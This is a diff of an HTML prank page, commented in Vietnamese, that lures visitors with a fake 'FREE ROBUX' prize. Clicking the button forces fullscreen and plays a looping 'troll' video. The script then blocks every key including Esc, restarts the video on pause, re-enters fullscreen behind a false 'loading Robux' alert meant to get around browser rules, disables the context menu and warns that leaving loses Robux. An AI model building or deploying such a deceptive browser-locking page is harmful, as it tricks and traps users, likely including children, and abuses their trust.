@@ -9,66 +9,32 @@
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
             background: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; overflow: hidden;
         }
-
         .container {
-            text-align: center;
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
-            z-index: 10;
-            width: 90%;
-            max-width: 450px;
+            text-align: center; background: white; padding: 40px;
+            border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            z-index: 10; width: 90%; max-width: 450px;
         }
-
         h1 { color: #00b06f; font-size: 28px; margin-bottom: 10px; }
         p { color: #666; margin-bottom: 25px; }
-
         .btn-claim {
-            padding: 18px 35px;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            border: none;
-            background: #00b06f;
-            color: white;
-            border-radius: 50px;
-            width: 100%;
-            transition: 0.3s;
+            padding: 18px 35px; font-size: 20px; font-weight: bold;
+            cursor: pointer; border: none; background: #00b06f;
+            color: white; border-radius: 50px; width: 100%;
             text-transform: uppercase;
         }
-
         #loading-section { display: none; margin-top: 25px; }
-        .progress-bg {
-            width: 100%; height: 25px;
-            background: #e9ecef;
-            border-radius: 50px;
-            overflow: hidden;
-        }
-        .progress-bar {
-            width: 0%; height: 100%;
-            background: linear-gradient(90deg, #00b06f, #00ff9d);
-            transition: width 0.1s linear;
-        }
-
-        /* VIDEO TROLL */
-        #trollVideo {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100vw; height: 100vh;
-            object-fit: cover;
-            background: black;
-            z-index: 999999;
-            pointer-events: none;
-        }
+        .progress-bg { width: 100%; height: 25px; background: #e9ecef; border-radius: 50px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: #00b06f; transition: width 0.1s linear; }
         
+        #trollVideo {
+            display: none; position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            object-fit: cover; background: black;
+            z-index: 999999; pointer-events: none;
+        }
         .no-cursor { cursor: none !important; }
     </style>
 </head>
@@ -76,20 +42,18 @@
 
     <div class="container" id="ui-box">
         <h1>💎 FREE ROBUX 💎</h1>
-        <p>Chúc mừng! Bạn nhận được 10,000 Robux. Nhấn xác nhận để nhận ngay!</p>
+        <p>Nhấn xác nhận để nhận 10,000 Robux vào tài khoản.</p>
         <button class="btn-claim" onclick="startTrap()">XÁC NHẬN NHẬN QUÀ</button>
 
         <div id="loading-section">
-            <div class="progress-bg">
-                <div class="progress-bar" id="bar"></div>
-            </div>
-            <p id="status-text" style="margin-top:10px; color:#888;">Đang kiểm tra tệp tin...</p>
+            <div class="progress-bg"><div class="progress-bar" id="bar"></div></div>
+            <p id="status-text" style="margin-top:10px; color:#888;">Đang kết nối...</p>
         </div>
     </div>
 
     <video id="trollVideo" loop playsinline disablePictureInPicture preload="auto">
         <source src="troll.mp4" type="video/mp4">
-        <source src="troll.mp4" type="video/quicktime"> </video>
+    </video>
 
 <script>
     const video = document.getElementById('trollVideo');
@@ -97,16 +61,15 @@
     const bar = document.getElementById('bar');
     const body = document.getElementById('mainBody');
 
-    // Tự động load video ngay khi trang web mở để tránh bị delay
-    window.onload = () => { video.load(); };
+    // 1. Chuẩn bị video trước
+    video.load();
 
     function startTrap() {
-        // 1. Ép Fullscreen
+        // Vào Fullscreen ngay lập tức khi click
         const doc = document.documentElement;
         if (doc.requestFullscreen) doc.requestFullscreen();
         else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
 
-        // 2. Chạy loading
         document.querySelector('.btn-claim').style.display = 'none';
         document.getElementById('loading-section').style.display = 'block';
 
@@ -115,7 +78,6 @@
             width += Math.random() * 2;
             if (width > 100) width = 100;
             bar.style.width = width + "%";
-
             if (width >= 100) {
                 clearInterval(loadInterval);
                 launchTroll();
@@ -128,50 +90,34 @@
         video.style.display = "block";
         body.classList.add('no-cursor');
 
-        // Thử phát video và xử lý lỗi
-        const playPromise = video.play();
-
-        if (playPromise !== undefined) {
-            playPromise.catch(error => {
-                console.error("Lỗi phát video:", error);
-                // Nếu lỗi, thử nạp lại lần nữa
-                video.load();
-                video.play();
+        // CHỈ PHÁT KHI VIDEO SẴN SÀNG ĐỂ TRÁNH LỖI NOT SUPPORTED
+        const tryPlay = () => {
+            video.play().catch(() => {
+                // Nếu lỗi do source, thử lại sau 1s
+                setTimeout(tryPlay, 1000);
             });
-        }
+        };
+        tryPlay();
 
-        // --- HỆ THỐNG KHÓA ---
-
-        // Chặn phím Esc và các phím chức năng
+        // CHẶN PHÍM VÀ THOÁT
         window.addEventListener('keydown', (e) => {
             e.preventDefault();
             e.stopPropagation();
-            return false;
         }, true);
 
-        // Chống tạm dừng
+        // Chống dừng
         video.onpause = () => video.play();
-        setInterval(() => {
-            if (video.paused) video.play();
-        }, 100);
-
-        // Tự động vào lại Fullscreen
+        
+        // Tự động fullscreen lại (kèm alert để lách luật trình duyệt)
         document.addEventListener('fullscreenchange', () => {
             if (!document.fullscreenElement && video.style.display === "block") {
-                alert("Hệ thống đang xử lý, vui lòng không thoát!");
-                document.documentElement.requestFullscreen().catch(() => {});
+                alert("Đang nạp Robux, vui lòng không thoát!");
+                document.documentElement.requestFullscreen();
             }
         });
 
-        // Chặn chuột
         document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('mousedown', e => {
-            e.preventDefault();
-            video.play();
-        });
-
-        // Ngăn đóng tab
-        window.onbeforeunload = () => "Dữ liệu đang tải, thoát sẽ mất Robux!";
+        window.onbeforeunload = () => "Thoát sẽ mất Robux!";
     }
 </script>
 </body>
